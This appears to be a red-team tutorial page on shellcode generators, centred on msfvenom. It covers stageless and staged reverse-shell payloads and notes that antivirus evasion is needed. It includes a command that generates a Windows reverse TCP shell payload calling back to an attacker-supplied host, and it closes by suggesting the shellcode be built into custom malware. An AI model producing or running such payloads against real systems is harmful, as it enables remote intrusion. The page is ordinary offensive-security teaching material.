# Shellcode Generators

There are open-source shellcode generators. They can usually generate different payloads with encoding and encryption for different programming languages. The best known is `msfvenom`. Usually mature and expensive C2 (Command & Control) frameworks have their own compatible shellcode generators.

## Msfvenom

Msfvenom allows payloads to be prepared very quickly, but all serious antiviruses are very familiar with the payloads it generates. **Without additional encoding or obfuscation, there is no chance of using any generated payload in a real-world scenario**. It will be detected immediately.

Msfvenom has basically two output formats:

- Transform formats: generate a payload simply as a variable ready for use in various programming languages (such as C or C#). All serious antiviruses are very familiar with the payloads it generates. **Without additional encoding or obfuscation, there is no chance of using any generated payload in a real-world scenario**. But it's still useful as a basis to further encryption or encoding and custom template development.
- Executable gormats: generate a ready-made executable file (`.exe`, `.dll`, `.vbs` and so on). **Do not use this option. All these generated templates are very well detected by all antiviruses**. Encryption and encoding doesn't actually change anything, because antiviruses detect the executable file template itself, not the payload.

There are two basic categories of msfvenom shellcodes:

- stageless (e.g. `windows/x64/shell_reverse_tcp`) - the generated payload contains everything needed to connect back to the listener.
- staged (e.g. `windows/x64/shell/reverse_tcp`) - the generated payload contains only a downloader of the actual shellcode from an external server (Metasploit listeners).

> **NOTE**: There are also payloads prepared specifically to work with the open-source Metasploit C2 framework. In addition to the standard remote shell, they add a lot of additional offensive functionality. The naming convention is the same as the ones given above, but instead of the word "shell" they contain the word "meterpreter".

```bash
# List of all available payloads
msfvenom --list payloads

# List of all available output formats
msfvenom --list formats

# Stageless reverse TCP shell in C format
msfvenom -p windows/x64/shell_reverse_tcp -f c LHOST=$ip LPORT=$port
```

We can use the generated shellcode in many different programming languages to create our own custom malware.
